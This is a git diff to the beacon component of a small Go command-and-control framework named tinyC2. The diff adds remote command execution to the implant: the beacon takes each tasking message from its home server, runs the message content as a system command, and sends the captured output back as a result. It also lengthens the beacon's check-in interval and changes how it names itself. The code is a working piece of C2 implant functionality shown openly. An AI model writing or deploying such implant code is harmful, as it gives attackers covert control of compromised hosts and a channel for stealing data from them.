@@ -3,15 +3,16 @@ package beacon
 import (
 	"encoding/json"
 	"io"
+	"os/exec"
+	"strings"
 	"time"
-	"math/rand"
 
 	"github.com/patbcole117/tinyC2/comms"
 )
 
 var (
 	BEACON_CHANNEL_LIMIT int          	= 10
-	BEACON_SLEEP_TIME    time.Duration 	= 1 * time.Second
+	BEACON_SLEEP_TIME    time.Duration 	= 5 * time.Second
 	BEACON_DEFAULT_NAME_SIZE 	int 	= 10
 )
 
@@ -32,7 +33,7 @@ func NewBeacon(h, c string) (*Beacon, error) {
 		InQ:  make(chan comms.Msg, BEACON_CHANNEL_LIMIT),
 	}
 
-	b.initName(BEACON_DEFAULT_NAME_SIZE)
+	b.Name = comms.GetRef(BEACON_DEFAULT_NAME_SIZE)
 	b.Dob = time.Now()
 	b.Hello = time.Now()
 	tx, err := comms.NewCommsPackageTX(c)
@@ -42,15 +43,6 @@ func NewBeacon(h, c string) (*Beacon, error) {
 	b.Tx = tx
 
 	return b, nil
-}
-
-func (b *Beacon) initName(sz int) {
-	abc := []rune("abcdefghijklmnopqrstuvwxyz1234567890")
-	n := make([]rune, sz)
-	for i := range n {
-		n[i] = abc[rand.Intn(len(abc))]
-	}
-	b.Name = string(n)
 }
 
 func (b *Beacon) Run() {
@@ -98,9 +90,17 @@ func (b *Beacon) SayHello() {
 func (b *Beacon) DoNext() {
 	select{
 	case j := <- b.InQ:
-		b.OutQ <- comms.Msg{From: b.Name, To: b.Home, Type: "result", Ref: j.Ref, Content: "TODO"}
+		args := strings.Split(j.Content, " ")
+		cmd := exec.Command(args[0], args[1:]...)
+		var out strings.Builder
+		cmd.Stdout = &out
+		cmd.Stderr = &out
+		if err := cmd.Run(); err != nil {
+			b.OutQ <- comms.Msg{From: b.Name, To: b.Home, Type: "result", Ref: j.Ref, Content: err.Error()}
+			return
+		}
+		b.OutQ <- comms.Msg{From: b.Name, To: b.Home, Type: "result", Ref: j.Ref, Content: out.String()}
 	default:
-		
 	}
 }
 
